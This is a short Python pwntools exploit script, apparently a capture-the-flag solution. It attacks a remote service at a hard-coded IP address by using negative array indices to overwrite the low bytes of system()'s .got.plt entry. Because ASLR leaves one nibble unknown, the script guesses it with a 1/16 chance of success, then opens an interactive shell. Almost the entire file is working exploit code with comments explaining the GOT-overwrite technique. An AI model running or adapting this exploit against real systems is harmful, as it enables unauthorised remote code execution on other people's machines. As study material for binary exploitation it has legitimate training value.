from pwn import *
from random import randrange

# The same observations apply as in the local case except the fact that libc
# seems to get loaded at a base image address that has only 3 guaranteed zeros at the end (e.g. 7f7dcb631000).
# We still need to replace the 2 least significant bytes of the .got.plt entry of system(),
# but now we don't know the 4 most significant BITS of the second least significant byte.
# (the byte that was 0x52 in the local exploit. We don't know the 0x5 part, but we still know the 0x2 part).
# But 4 bits => 16 posibilities => 1/16 chance of success if we try a random nibble.


io = remote('45.76.91.112', '10072')

io.recvuntil(b'Do you like the current ASCII art? Y/N')
io.sendline(b'N')

io.recvuntil(b'What do you want to modify? idx new_val')
idx1 = -72 # The index necessary to get to the least significant byte in the .got.plt entry of system()
byte1 = 22
io.sendline(f'{idx1} {byte1}'.encode())

io.recvuntil(b'Finished?')
io.sendline(b'N')

io.recvuntil(b'What do you want to modify? idx new_val')
idx2 = -71 # The index necessary to get to the second least significant byte in the .got.plt entry of system()
random_nibble = randrange(16)
byte2 = 16 * random_nibble + 2
print(f'{hex(byte2) = }')
io.sendline(f'{idx2} {byte2}'.encode())

io.recvuntil(b'Finished?')
io.sendline(b'Y')

io.sendline(b'ls') # To see in Terminal if successful

io.interactive()
